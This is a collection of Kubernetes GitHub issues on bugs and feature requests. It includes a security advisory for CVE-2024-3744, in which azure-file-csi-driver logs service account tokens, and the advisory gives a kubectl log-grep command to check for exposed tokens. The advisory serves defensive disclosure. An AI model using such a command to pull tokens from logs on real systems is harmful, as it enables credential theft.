title: `maskTrailingDash` doesn't match its intended behavior
body:
### What happened?

`maskTrailingDash` (https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apimachinery/pkg/api/validation/generic.go#L80-L85) is supposed to replace the final character of the (generate)name with "a" if the final character is "-". For example, "foo-" should be changed to "fooa". However, the code replaces the last two characters with "a", so "foo-" is changed to "foa".

This seems to be a bug that lets an invalid (generate)name pass. For example, "a?-" will be accepted, but the generated name "a?-vwxyz" is invalid.


### What did you expect to happen?

This can be simply fixed by replacing the final character only. I can send a PR for this.

title: cluster unaccessible due to etcd OOM killed and API server FullListIfExpired
body:
### What happened?

cluster became unaccessible due to etcd OOM killed and API server FullListIfExpired triggered by periodic etcd compaction

According to client-go list design, if the data is expired, it will fall-back to full-list
https://github.com/kubernetes/client-go/blob/v0.24.6/tools/pager/pager.go#L98

![image](https://github.com/kubernetes/kubernetes/assets/1474346/d5958e40-a477-4fe9-92d3-0ee0748955ef)

If the list's continue's revision is expired, there will be two requests to list all objects. The etcd server ended up consume lots of memory until Range gRPC call finishes, since the Range gRPC call is unary not streaming.

### What did you expect to happen?

FullListIfExpired behavior need be configurable or automatically enabled/disable based on request payload

### How can we reproduce it (as minimally and precisely as possible)?


in our case, the cluster has [kyverno](https://www.bing.com/search?pglt=43&q=kyverno&cvid=8581f777cb8f48d1a37c57a49ae022bd&aqs=edge.0.69i59j0l7j69i60j69i11004.287j0j1&FORM=ANNAB1&PC=U531) installed, there was one resource under /registry/kyverno.io/admissionreport with ~2m objects of 5GB size, but any cluster with large amount of resource objects can run into this issue

title: client-go doesn't properly handle reloading trust anchors during cluster CA rotation
body:
Discussed in SIG Auth: https://docs.google.com/document/d/1woLGRoONE3EBVx-wTb4pvp4CI7tmLZ6lS26VTbosLKM/edit#bookmark=id.5mfr9vowfkwr

The kube-apiserver serving root CA certificate is injected into pods at /var/run/secrets/kubernetes.io/serviceaccount/ca.crt.

Client-go reads it once [here](https://github.com/kubernetes/client-go/blob/6c596fdbc11ce7779ee320c6a11df44c5d516d54/rest/config.go#L528).  Normally the transport is supposed to automatically reload the roots, but it doesn't set reloadTLSFiles if a CAFile is set [here](https://github.com/kubernetes/kubernetes/blob/928adb27abf755b402be7594844e3c248b0b7670/staging/src/k8s.io/client-go/transport/transport.go#L155-L168).

The net effect is that most clients using InClusterConfig will find their connection to kube-apiserver permanently broken during a rotation of the kube-apiserver serving CA, and won't recover until they are restarted.

We should:
* Set reloadTLSFiles when CAFile is set.
* Make sure that reloadTLSFiles will actually re-read the CAFile.
* Add a test.

/sig auth

title: kubelet use --register-with-taints=node.kubernetes.io/unschedulable=true:NoSchedule wiil be remove by node-lifecycle-controller if  node.spec.Unscheduleable=false
body:
### What happened?

When `node.spec.Unschedulable = false`, the `node-lifecycle-controller` will automatically remove the `node.kubernetes.io/unschedulable=true:NoSchedule` taint from the node.

Most of the time, this mechanism works well. However, sometimes I want the node to be registered with this taint by default, and only remove it manually when I decide to, instead of having it removed automatically by the `node-lifecycle-controller`.

In this case, maybe I need to add `--register-schedulable=false --register-with-taints=node.kubernetes.io/unschedulable=true:NoSchedule` to the kubelet startup configuration. Unfortunately, this flag(--register-schedulable) has been marked as deprecated, and I am not sure whether I should use it.

```go
        // registerSchedulable tells the kubelet to register the node as
	// schedulable. Won't have any effect if register-node is false.
	// DEPRECATED: use registerWithTaints instead
	RegisterSchedulable bool
```


### What did you expect to happen?

I expect that the `node.kubernetes.io/unschedulable=true:NoSchedule` taint added when registering the node will not be automatically removed by the `node-lifecycle-controller`.

### How can we reproduce it (as minimally and precisely as possible)?

1. Create a node and configure kubelet with `--register-with-taints=node.kubernetes.io/unschedulable=true:NoSchedule`.
2. Check the node's taints; it does **not** include this taint.

### Anything else we need to know?

I set the log level of` kube-controller-manager` to 4, and I was able to observe that the taint was indeed removed by the `node-lifecycle-controller`.

```shell
I0521 11:21:46.172081       7 controller_utils.go:223] "Made sure that node has no taint" node="192.168.0.200" taint=[{"key":"node.kubernetes.io/unschedulable","value":"true","effect":"NoSchedule"}]
```

title: How to enable same StorageClass work for both Linux and Windows
body:
Use cases:

- single -writer: Data flow from Linux node to Windows node or vice versa 
- Multi-writer: data can be accessed by multiple nodes with different oses.

Issues:
Mountoptions: the same pvc with same storageClass will be used by kubelet and csi-driver running on different OSes. How to separate parameters based on os?

Proposal:

- Short-team: kubelet vs. csi driver

  mountOptions: add prefix when passing parameters
```
mountOptions:
- [unix.sigs.k8s.io]:noatime
- [unix.sigs.k8s.io]:nfsvers=3
- [windows.sigs.k8s.io]:foobar
```
     - Kubelet: add logic to separate mount options for linux/windows

        - Pros: no changes needed for individual csi driver.
        - Cons: hard to find appropriate string parsing schema

    - CSI driver: add logic in each individual driver to handle it.

        - Pros: no need to change kubelet side
        - Cons: different csi drivers might diverge to different ways of parsing options.

- Long-team: storage, security, network might all face this issue. Need OS context information into API spec in a general and consistent way.

title: Support HTTP2 probes over cleartext (h2c)
body:
I'd like to request that this use case becomes supported. At work, we are running a cluster behind a massive HTTP load balancer, so we have no real reason to support TLS in our microservices and ingresses. The load balancer takes care of that.

I can't really say that I like what happened in the original issue https://github.com/kubernetes/kubernetes/issues/97330...

@lol768 is another user that has this specific use case in mind.

Now, because this use case was not accommodated in the past, I now have to introduce a really frankensteinian network setup into my namespace.

----- BEGIN EDIT 1 -----
The reason why I've even introduced HTTP/2 support into my microservices is because there are clear advantages of HTTP/2 over HTTP/1.1 in the use case of the project I work for, that have to do with efficiency and performance.

----- END EDIT 1 -----

I now have to make sure that every web service has a second listening port where it only emits HTTP/1.1 so that Kubernetes will be able to issue probes into it. And to make this port a probe-only port that doesn't get exposed outside, I need to make sure that my ingresses will never expose it, or anyone from the team never dares to expose it. And to make sure that the probe-only port doesn't leak any sensitive data, I have to make sure that it returns only some kind of generic HTTP response to the probes.

At this point you're probably thinking why won't I just get a TCP probe to knock on the port where we serve HTTP/2. This will work of course, but it's naive. It misses the point. If this was a TCP service that doesn't serve HTTP, it would make perfect sense, but it isn't. HTTP is not just TCP 80 or 8080 or what have you, but it's a probe with extra context - the return is expected to be a HTTP response, so that we know the microservice isn't just merely accepting connections, it's also sending coherent responses.

I hope this is explanation enough and that its merits are reasonable.

title: DaemonSet dynamic/scaled resources based on node type
body:
### What would you like to be added?

_Intro note: I've read about KEP, however, I'm merely a busy engineer that loves Kubernetes. I'm not sure I can lead my feature request through the KEP process. Please consider this as my initial reach out, if anything to have my voice heard and poll my idea to the community. If there is enough traction, I could follow up and/or someone else could lead it._

I want to propose an enhancement to the DaemonSet (DS) resource management in Kubernetes. The DaemonSet, as it stands, is an invaluable feature for ensuring that each node in a cluster runs a copy of a specific pod. However, I have identified an area where its functionality could be significantly improved: dynamic and scaled resource allocation based on node type.

### Current Limitation: Static Resource Definition

Currently, the resource allocation logic for DaemonSets is rather static. When defining resources for a DaemonSet, such as CPU and memory, it operates on an 'all-or-nothing' basis. This approach does not leverage the full potential of diverse node environments.

### Diverse Node Environment in Current Ecosystem

In the present cloud ecosystem, there's an extensive variety of node types available. These range from nodes with as little as 1 virtual CPU to those as large as 488 CPUs offered by services like AWS. This diversity in node capabilities is not currently accounted for in the DaemonSet design.

### Resource Dependence on Node Size and Pod Density

The workload resources for a DaemonSet, particularly memory and CPU, are often dependent on the number of pods running on a node. More importantly, they can also depend on the size or capacity of the node itself. For instance, a node with more CPUs and memory can, and ideally should, handle more intensive workloads.

### Lack of Native Methods for Dynamic Resource Allocation

As of now, Kubernetes does not offer native methods to define resources for a DaemonSet based on the size or capacity of the node. While it is possible to categorize nodes into groups based on size, this solution is cumbersome and static. It requires significant manual intervention and does not adapt dynamically as the cluster evolves.

### Existing Alternatives

I acknowledge that there are existing methods to manage this challenge, such as adding nodes to different node groups and then using affinity rules to place DaemonSets with different resource requirements. However, this approach is quite tedious and complex. It requires significant manual configuration and continuous adjustment, which detracts from usability and efficiency. This method does not truly cater to the dynamic nature of resource demands in a Kubernetes environment.

### Proposal: Dynamic/Scaled Resource Allocation for DaemonSets

I propose the introduction of a feature that allows DaemonSets to dynamically allocate resources based on the type or capacity of the node. This feature would analyze the node's characteristics (such as CPU andmemory capacity plus it's maximum pods that it can hold) and automatically define the resources allocated to the DaemonSet's pods running on that node.

This dynamic allocation would ensure more efficient use of cluster resources, improve performance, and potentially reduce costs by maximizing the utilization of each node's capacity. It would also significantly reduce the management overhead for Kubernetes administrators, as the system would automatically adapt to changes in the node landscape.

In summary, incorporating dynamic and scaled resource allocation for DaemonSets based on node type would be a substantial improvement in Kubernetes' functionality. It would enhance the adaptability of DaemonSets to diverse and evolving node environments, leading to more efficient resource usage and simplified cluster management.



### Why is this needed?

title: Reuse the http request object for http probes
body:
Today we construct the request object for every http request for the http probes. This involves concatenating some strings, setting headers, etc.

Probes are simple http get requests that are executed synchronously (for a single probe) and has no request body.

The optimization may be to reuse the request object for all probe executions. This likely save some cpu and memory for the kubelet process.

Some code references:
- [DoProbe](https://github.com/kubernetes/kubernetes/blob/4dfd2fe74d96f67c9752bbdc9ae9983a6e5f0492/pkg/probe/http/http.go#L93) is executed today on each probe execution.
- New request are [being created](https://github.com/kubernetes/kubernetes/blob/4dfd2fe74d96f67c9752bbdc9ae9983a6e5f0492/pkg/kubelet/prober/prober.go#L146) for each execution.
- New object will need to be stored in [worker](https://github.com/kubernetes/kubernetes/blob/4dfd2fe74d96f67c9752bbdc9ae9983a6e5f0492/pkg/kubelet/prober/worker.go#L40) that for http probes will hold the http request object. This object will need to encapsulate the logic of [runProbe](https://github.com/kubernetes/kubernetes/blob/4dfd2fe74d96f67c9752bbdc9ae9983a6e5f0492/pkg/kubelet/prober/prober.go#L138) method of the prober.

I'm marking this issue as a good first issue, as the issue doesn't require deep knowledge of Kubernetes. However it is not an easy issue, a few parts of code will be affected and change needs to be done very carefully.

***Please review code and make sure you understand the task before self-assigning the issue.***

Implementation notes

1. If you can send the small benchmark results on probes with and without this optimization, it will be a good starting point. Note, for the benchmark, each probe can run once a second, not more often. But the number of probes is virtually unlimited since we are not defining the limit on number of containers per Pod. Realistically we are talking about 110 pods (max) with maybe 2 containers each, with 3 probes each (660 probes).
2. Code change may be big. So make sure to help reviewers to review the code. One idea may be to split implementation into multiple commits to simplify the review. First, creating the object encapsulating the logic of `runProbe`, second storing and initializing this object in `worker`, and third, actual reusing of the request object.

title: The kubelet process always recursively modifies the volume file permissions.
body:
### What happened?

We have a mechanical hard drive with relatively low disk I/O. A pod has mounted a PVC, which contains approximately 700,000 files. When the pod is rebuilt, after the CSI volume is normally mounted, it checks the directory permissions of the volume. Since the fsGroupChangePolicy is configured as OnRootMismatch and the mount directory permissions are set to 750, our code's requiresPermissionChange method checks if the directory permissions are 770. This results in permission changes being made every time the volume is mounted. If there are a large number of files and the disk is slow, the mounting process can take a very long time.
https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/pkg/volume/volume_linux.go#L131-L155
Additionally, there is another issue: the permissions of the created mount directory are set to 750. Why is there a subsequent check to determine if the permissions are 770?
The code for creating a directory is as follows: 
https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/pkg/volume/csi/csi_mounter.go#L212-L216

### What did you expect to happen?

The permission on the created directory must be the same as that on the check directory.

### How can we reproduce it (as minimally and precisely as possible)?

Create a pod with PVC and check directory permissions.

title: Allow setting ownership on mounted secrets
body:
<!-- Please only use this template for submitting enhancement requests -->

**What would you like to be added**:
Currently, you can set secret file permissions, but not ownership: (see the "Secret files permissions" section) 
https://kubernetes.io/docs/concepts/configuration/secret/#using-secrets

It would be good to add a `defaultOwner`, and possible `defaultGroup` field that would allow setting the default ownership of the secret files.

**Why is this needed**:
It is possible that there is more than one process running in a container, each running as a different user. (think `processA` running as `userA` and `processB` running as `userB`). `processA` might need to use `secretA` and `processB` to use `secretB`. 

To make the secrets usable today, `secretA` and `secretB` would need to be world-readable, because there is no way to set ownership on them. This is undesirable from the security standpoint, as `processA` could read `secretB` and vice versa.

title: CVE-2024-3744: azure-file-csi-driver discloses service account tokens in logs
body:
CVSS Rating: [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) - **MEDIUM** (6.5)

A security issue was discovered in azure-file-csi-driver where an actor with access to the driver logs could observe service account tokens. These tokens could then potentially be exchanged with external cloud providers to access secrets stored in cloud vault solutions.  Tokens are only logged when [TokenRequests is configured in the CSIDriver object](https://kubernetes-csi.github.io/docs/token-requests.html) and the driver is set to run at log level 2 or greater via the -v flag.

This issue has been rated **MEDIUM** [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) (6.5), and assigned **CVE-2024-3744**

### Am I vulnerable?

You may be vulnerable if [TokenRequests is configured in the CSIDriver object](https://kubernetes-csi.github.io/docs/token-requests.html) and the driver is set to run at log level 2 or greater via the -v flag.

To check if token requests are configured, run the following command:

kubectl get csidriver file.csi.azure.com -o jsonpath="{.spec.tokenRequests}"

To check if tokens are being logged, examine the secrets-store container log:

kubectl logs csi-azurefile-controller-56bfddd689-dh5tk -c azurefile -f | grep --line-buffered "csi.storage.k8s.io/serviceAccount.tokens"

#### Affected Versions

- azure-file-csi-driver <= v1.29.3
- azure-file-csi-driver v1.30.0

### How do I mitigate this vulnerability?

Prior to upgrading, this vulnerability can be mitigated by running azure-file-csi-driver at log level 0 or 1 via the -v flag.

#### Fixed Versions

- azure-file-csi-driver v1.29.4
- azure-file-csi-driver v1.30.1

To upgrade, refer to the documentation: https://github.com/kubernetes-sigs/azurefile-csi-driver?tab=readme-ov-file#install-driver-on-a-kubernetes-cluster 

### Detection

Examine cloud provider logs for unexpected token exchanges, as well as unexpected access to cloud resources.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

#### Acknowledgements

This vulnerability was patched by Weizhi Chen @cvvz from Microsoft.

Thank You,
Rita Zhang on behalf of the Kubernetes Security Response Committee

/triage accepted
/lifecycle frozen
/area security
/kind bug
/committee security-response

title: Use `secrets` field in `NodePublishVolumeRequest` for sa tokens
body:
If the `TokenRequests` field is set in the `CSIDriver` spec, the tokens are generated and funneled from kubelet to driver as part of volume attributes map. The key for the tokens in the map is `csi.storage.k8s.io/serviceAccount.tokens`.  The service account tokens can be used for workload identity in cloud providers. Especially in case of Secrets Store CSI Driver, these service account tokens are used to access external secrets store to get secrets and mount in the volume. 

As these tokens are sensitive information, it doesn't feel right to include these in the volume context map along with pod name, namespace, service account name which are non-sensitive information. There is a dedicated [secrets field in the proto](https://github.com/container-storage-interface/spec/blob/master/lib/go/csi/csi.pb.go#L4063-L4066) which today is being used for `nodePublishSecretRef` that would be more appropriate for tokens.

To provide more context on "why this issue", we had a CVE in the Secrets Store CSI Driver (ref: [CVE-2023-2878](https://github.com/kubernetes-sigs/secrets-store-csi-driver/security/advisories/GHSA-g82w-58jf-gcxx)) where the service account tokens were logged as part of the GRPC request in the driver. We use the [protosanitizer](https://github.com/kubernetes-csi/csi-lib-utils/blob/master/protosanitizer/protosanitizer.go) in the driver to sanitize the requests before logging but given volume context is not really considered a "secret", the tokens were skipped and logged. We got around this by building custom logic for logging in the driver to strip the tokens but this is something every driver would need to do to be careful and not log the tokens. A change could be made in protosanitizer to sanitize this but given volume context is a map, either entire map needs to be marked a secret or sanitizing has to be done on a field by field basis. Although this prompted me to create this issue, I think volume context is not really "secrets" and appropriate field for sensitive sa tokens would be the secrets field.

/sig storage

title: DRA: No user-facing feedback when CEL device selectors don't match any device
body:
### What happened?

When a ResourceClaim has valid CEL device selectors that don't match any available device, the only feedback the user receives is a generic Pod scheduling failure: `"cannot allocate all claims"`. There is no information about:
- Which claim/request couldn't be satisfied
- Which CEL selector expression didn't match
- What attribute/capacity values the available devices actually had

The only way to debug this today is to enable V(7) scheduler logs, which shows per-device CEL evaluation results but still doesn't show the device's actual attribute values.

In the code, `selectorsMatch()` in `staging/src/k8s.io/dynamic-resource-allocation/structured/internal/stable/allocator_stable.go` returns `(false, nil)` for valid-but-non-matching expressions. This silent non-match propagates all the way up to the scheduler plugin which produces the generic `"cannot allocate all claims"` message with no additional context.

There is an existing TODO in the code at that location:
```go
// TODO (future): more detailed errors which reference class resp. claim.
```

### What did you expect to happen?

Users should receive actionable feedback when CEL selectors don't match any device. For example:
- An event on the Pod or ResourceClaim indicating which selector(s) failed to match
- A condition on the ResourceClaim with details about the non-match
- At minimum, a more descriptive scheduling failure message that names the specific claim/request that couldn't be allocated

### How can we reproduce it (as minimally and precisely as possible)?

1. Create a DeviceClass and ResourceSlice with devices that have specific attributes
2. Create a ResourceClaim with a CEL selector that doesn't match any device (e.g., `device.attributes["example.com"].memory.isGreaterThan(quantity("999Gi"))` when no device has that much memory)
3. Create a Pod referencing the ResourceClaim
4. Observe that the Pod is stuck in Pending with only the message `"cannot allocate all claims"` and no further detail about which selector or device was the problem

### Anything else we need to know?

Key files involved:
- `staging/src/k8s.io/dynamic-resource-allocation/structured/internal/stable/allocator_stable.go` — `selectorsMatch()` silently returns `(false, nil)` on non-match
- `staging/src/k8s.io/dynamic-resource-allocation/structured/allocator.go` — `Allocate()` returns `nil, nil` when no devices match
- `pkg/scheduler/framework/plugins/dynamicresources/dynamicresources.go` — produces the generic `"cannot allocate all claims"` status
- `staging/src/k8s.io/dynamic-resource-allocation/cel/compile.go` — `DeviceMatches()` returns `(bool, *cel.EvalDetails, error)` but the details are not surfaced to users

title: [KEP-4680] DRA: Make device health check timeout configurable
body:
### What would you like to be added?

The timeout for marking a DRA device's health as "Unknown" is currently hardcoded to 30 seconds. This should be made configurable.

This is an update/enhancement for the new DRA Device Health feature being introduced by KEP-4680.

### Why is this needed?

As discussed in the review for PR #130606 (https://github.com/kubernetes/kubernetes/pull/130606/files#r2221829511), a single hardcoded timeout is not ideal for all types of hardware. Different devices (e.g., GPUs, FPGAs, TPUs, storage) may have very different health-reporting characteristics and require different timeout values.

The most robust long-term solution would be to make this a per-plugin setting, allowing each vendor to specify an appropriate timeout for their hardware. This issue tracks the work to add this configurability, which should be a prerequisite for graduating the feature to Beta.

/priority important-longterm

title: The image of a running container was deleted by the image garbage collection
body:
### What happened?

The image of the container was deleted while pod was running.
When I noticed it, it was already almost two weeks after the pod was created, and by prometheus metrics, I could see at the time that the pod was created the kubelet performed image garbage collection on the node and images were deleted.

It might be worth mentioning that nothing other than the kubelet could have deleted the image from the node.

This situation happen a while ago, and I couldn't deal with it for too long while it happened, So unfortunately I don't have data to share. But by looking in the code the following scenario seems to make sense:
1. At the start of the garbage collection process the image was already in the node (for a while), but not in used yet. 
2. The garbage collection get the current images and pods on that node from the runtime, because this image is not in use by any pod, it is considered unused.  Ref: https://github.com/kubernetes/kubernetes/blob/b340ef2e29b1694464bee60487160654d4bf8bbc/pkg/kubelet/images/image_gc_manager.go#L232-L247
3. Before the image is actually deleted, A pod using this image is scheduling at this node. since the image is already on the node and the `imagePullPolicy` is `IfNotPresent` there is no need for pulling and the container is start to running. There is no knowledge about that the image is about to be deleted. Ref: https://github.com/kubernetes/kubernetes/blob/b340ef2e29b1694464bee60487160654d4bf8bbc/pkg/kubelet/images/image_manager.go#L126-L143
4. The garbage collection is still running, and it eventually comes to delete this image. There is no knowledge about that the image is in use now.

In short, I think that in the time between pods are detected from runtime to find the unused image to the time those images are  actually deleted (the time between step 2 to step 4), new pods could be scheduling on that node, and make use of the images that will be deleted by the garbage collection immediately afterwards. Although the chances of this scenario are rare, the troublesome time I described would be bigger when the node could contain a lot of images and pods, and the difference between `HighThresholdPercent` and `LowThresholdPercent` have an effect as well.



### What did you expect to happen?

The image garbage collection should not delete used images. 

### How can we reproduce it (as minimally and precisely as possible)?

Suppose an unused image X has already been on the node for some time.

title: If node reports falsely Ready before it creates server CSR, certificate templates never populate and server CSR is not created
body:
### What happened?

When debugging https://github.com/kubernetes/kubernetes/issues/130001 with @lentzi90, we tried so many ways to figure out why the CSR was not created. One was #130409 and another one was that if node is considering itself `Ready` while not actually being Ready, before it creates server CSR, those will be forever stuck as it does not get templates. Client CSR and cert are provisioned properly.

Detecting this loop required additional logging to be added, such as @lentzi90's branch [here for 1.32](https://github.com/Nordix/kubernetes/tree/lentzi90/kubelet-logging-release-1.32) or [here for main](https://github.com/Nordix/kubernetes/tree/lentzi90/kubelet-logging).

Logs:

```console
available
...
```
and it sits there for all eternity, printing it does not have certificate template.

### What did you expect to happen?

Kubelet to initialize itself, request client and server CSRs as configured with bootstrapping and rotation in kubeadm config.


### How can we reproduce it (as minimally and precisely as possible)?

Now this is tricky part. Kubelet thinks its ready when it has CNI config files in `/etc/cni/net.d/...` and it has _some_ routes (not exactly sure what counts). This means this issue can be occuring only when resetting an existing node, or maybe when upgrading, or some other lifecycle management operations are run, or maybe if someone optimizes the node installation somehow. A clean VM and and first time kubeadm init will not run into this issue AFAIK.

Using very simple kubeadm config:

```yaml
kind: KubeletConfiguration
apiVersion: kubelet.config.k8s.io/v1beta1
serverTLSBootstrap: true
rotateCertificates: true
``` 

we init the cluster, and then install Calico on it (to get the config, and the routes):

```console
kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml
...
``` 
and we can see node turns `Ready` way before Calico manages to run more than one or two calico-node containers (which create the configs/binaries/routes). We then do some LCM operation, simulated here with a reset, without manually nuking more than kubeadm is cleaning up:

```console
sudo kubeadm reset -f
```

If we now run `kubeadm init` again, it will report node Ready (as it has everything in place right away, without installing Calico again) and CSR will be created just fine.  But there are certain conditions where node thinks it is still Ready, but it fails, especially related to networking/routes, which sometimes happen during maintenance and are later really hard to catch and debug, as Kubelet does not print a single thing related to server CSRs, unless instrumented as documented above.

Would a PR that adds some logging to server CSR creation, say at level 4, be acceptable?

### Anything else we need to know?

I apologize for the lack of exact reproduction steps. I managed to achieve this condition several times during CSR creation debugging, but due nature of debugging failed to capture/understand the exact condition that satisfies the node checks, yet still causes this issue. I'm hoping this helps someone more knowledgeable realize which condition that might be.

I will keep debugging this for a while more, pointers are welcome.

title: [Umbrella] Make client-go lighter and easier to consume
body:
### Description

The current structure of client-go, with its dependencies on `k8s.io/api` and `k8s.io/apimachinery` present some significant challenges:

* **Dependency bloat:** projects end up pulling in a large number of transitive dependencies, increasing binary size and potentially leading to conflicts.
* **Versioning headaches:** Updating client-go often necessitates updating the dependent projects as well, which can be complex and time-consuming, especially with the need for coordinated releases.
* **Tight coupling:** This structure creates tight coupling between client-go and the underlying API definitions, making necessary to update the clients to be able to use the new API types.

### How to repro

Using the workqueue example https://github.com/kubernetes/kubernetes/tree/master/staging/src/k8s.io/client-go/examples/workqueue and creating a new project, after doing `go mod tidy` the `go.mod` file looks like:

<details>
<summary>go.mod</summary>

```
module client-go-example

go 1.23

require (
        k8s.io/api v0.31.1
        k8s.io/apimachinery v0.31.1
        k8s.io/client-go v0.31.1
        k8s.io/klog/v2 v2.130.1
)

require (
        github.com/davecgh/go-spew v1.1.2-0.20180830191138-d8f796af33cc // indirect
        github.com/emicklei/go-restful/v3 v3.11.0 // indirect
        github.com/fxamacker/cbor/v2 v2.7.0 // indirect
        github.com/go-logr/logr v1.4.2 // indirect
        github.com/go-openapi/jsonpointer v0.19.6 // indirect
        github.com/go-openapi/jsonreference v0.20.2 // indirect
        github.com/go-openapi/swag v0.22.4 // indirect
        github.com/gogo/protobuf v1.3.2 // indirect
        github.com/golang/protobuf v1.5.4 // indirect
        github.com/google/gnostic-models v0.6.8 // indirect
        github.com/google/go-cmp v0.6.0 // indirect
        github.com/google/gofuzz v1.2.0 // indirect
        github.com/google/uuid v1.6.0 // indirect
        github.com/imdario/mergo v0.3.6 // indirect
        github.com/josharian/intern v1.0.0 // indirect
        github.com/json-iterator/go v1.1.12 // indirect
        github.com/mailru/easyjson v0.7.7 // indirect
        github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
        github.com/modern-go/reflect2 v1.0.2 // indirect
        github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822 // indirect
        github.com/spf13/pflag v1.0.5 // indirect
        github.com/x448/float16 v0.8.4 // indirect
        golang.org/x/net v0.26.0 // indirect
        golang.org/x/oauth2 v0.21.0 // indirect
        golang.org/x/sys v0.21.0 // indirect
        golang.org/x/term v0.21.0 // indirect
        golang.org/x/text v0.16.0 // indirect
        golang.org/x/time v0.3.0 // indirect
        google.golang.org/protobuf v1.34.2 // indirect
        gopkg.in/inf.v0 v0.9.1 // indirect
        gopkg.in/yaml.v2 v2.4.0 // indirect
        gopkg.in/yaml.v3 v3.0.1 // indirect
        k8s.io/kube-openapi v0.0.0-20240228011516-70dd3763d340 // indirect
        k8s.io/utils v0.0.0-20240711033017-18e509b52bc8 // indirect
        sigs.k8s.io/json v0.0.0-20221116044647-bc3834ca7abd // indirect
        sigs.k8s.io/structured-merge-diff/v4 v4.4.1 // indirect
        sigs.k8s.io/yaml v1.4.0 // indirect
)
```
</details>

and its size is 

```
ls -lah main
-rwxr-x--- 1 aojea primarygroup 51M Oct  6 08:41 main
```

### Proposal

* **Modularization:** Breaking down client-go into smaller, more focused modules would allow users to import only the functionalities they need, reducing dependency bloat and improving maintainability.
* **Generic clients and Versioned APIs:** Providing generic clients that can use versioned API clients would enable users to target specific Kubernetes versions without being forced to update the entire client-go library.
* **Reducing dependencies:** eliminate unnecessary dependencies within client-go and its related projects.

### Design Details

#### k8s.io/api

Ideally this should be a self contained module without dependencies,  but it depends on apimachinery for the generated code and registering the types

https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/staging/src/k8s.io/api/go.mod#L3-L13

It requires `k8s.io/apimachinery` because of:

* schema
```
register.go:     "k8s.io/apimachinery/pkg/runtime"
register.go:     "k8s.io/apimachinery/pkg/runtime/schema"
zz_generated.deepcopy.go:        runtime "k8s.io/apimachinery/pkg/runtime"
```
* metav1
```
register.go:     metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
zz_generated.deepcopy.go:        v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
```

* utils for types

```
"k8s.io/apimachinery/pkg/util/validation"
zz_generated.deepcopy.go:  intstr "k8s.io/apimachinery/pkg/util/intstr"
resource/v1alpha3/types.go:     "k8s.io/apimachinery/pkg/util/validation"
```

**NOTE** This validation can be easily avoided and it seems is only to match a constant  (cc: @pohly )

https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/staging/src/k8s.io/api/resource/v1alpha3/types.go#L186

#### k8s.io/apimachinery

This is the more tricky, and it is bringing a lot of dependencies

https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/staging/src/k8s.io/apimachinery/go.mod#L3-L33

#### k8s.io/client-go

These module contains all the generated code, the typed clients and the dynamic client. Thanks to @skitt we already have  [Generics to share code in client-go](#121439 )

In addition to the dynamic client we could have a Generic client, that will be able to work with different versions of k8s.io/api, allowing users to work with skew between k8s.io/client-go and  k8s.io/api, though this requires a very high bar on these modules to avoid breaking clients and provide stability across the ecosystem.

https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/staging/src/k8s.io/client-go/go.mod#L3-L37

Ideally we should be able to split the API types from the tooling and allow consumers to use generics, something like

```go
import (
  corev1 "k8s.io/api/core/v1"
	k8s.io/client-go/generic
)


func main(
	client := generic.NewClient[corev1.Pod]
	list, err := client.Namespace("foo").List()

)
```

and use generic controllers, we already have some intree

https://github.com/kubernetes/kubernetes/blob/a7fcc89ac0e7124158eee58820bbf517e0a15377/staging/src/k8s.io/apiserver/pkg/admission/plugin/policy/internal/generic/interface.go#L27-L59

#### Tasks

- [ ] remove unnecessary dependencies, per example, testing frameworks only offer cosmetic benefits but bring dependencies, despite they are not used to build the binary the make more noisy the dependency tree https://github.com/kubernetes/kubernetes/pull/127876
- [ ] consolidate, per example,  we have our own fork of go-yaml https://github.com/kubernetes-sigs/yaml/pull/76 so we can switch all the dependencies to it to have just one path and also avoid possible code drifting
- [ ] stricter rules for client-go and apimachinery exported code, @pohly  already has setup a job as optional https://github.com/kubernetes/test-infra/pull/33579
- [ ] https://github.com/kubernetes/kubernetes/issues/127889


### References

*  #124380 
*  #106846
* [Analyzing Go Binary Sizes](https://blog.howardjohn.info/posts/go-binary-size/)

#### Notes

I don't create a KEP because there are a considerable number of dimensions in this problem, so as first step I just want to gather feedback and take a more iterative approach, there are things like dependency pruning that can be worked out without a KEP, once we reach a point we need to implement some user facing change I will open the corresponding KEP

/sig architecture
/sig api-machinery

title: Unable to Set External Store in client-go
body:
### What would you like to be added?

In shared_informer.go, when the resources are fetched from API Server, they are always cached in Memory and there is no mechanism to control that store. 

```
func NewSharedIndexInformer(lw ListerWatcher, exampleObject runtime.Object, defaultEventHandlerResyncPeriod time.Duration, indexers Indexers) SharedIndexInformer {
	realClock := &clock.RealClock{}
	sharedIndexInformer := &sharedIndexInformer{
		processor:                       &sharedProcessor{clock: realClock},
		indexer:                         NewIndexer(DeletionHandlingMetaNamespaceKeyFunc, indexers),
		listerWatcher:                   lw,
		objectType:                      exampleObject,
		resyncCheckPeriod:               defaultEventHandlerResyncPeriod,
		defaultEventHandlerResyncPeriod: defaultEventHandlerResyncPeriod,
		cacheMutationDetector:           NewCacheMutationDetector(fmt.Sprintf("%T", exampleObject)),
		clock:                           realClock,
	}
	return sharedIndexInformer
}
```
It is better to have a provision to supply the store as well something like below.
I would like to write the resource information to disk instead of memory to reduce the memory usage.

```
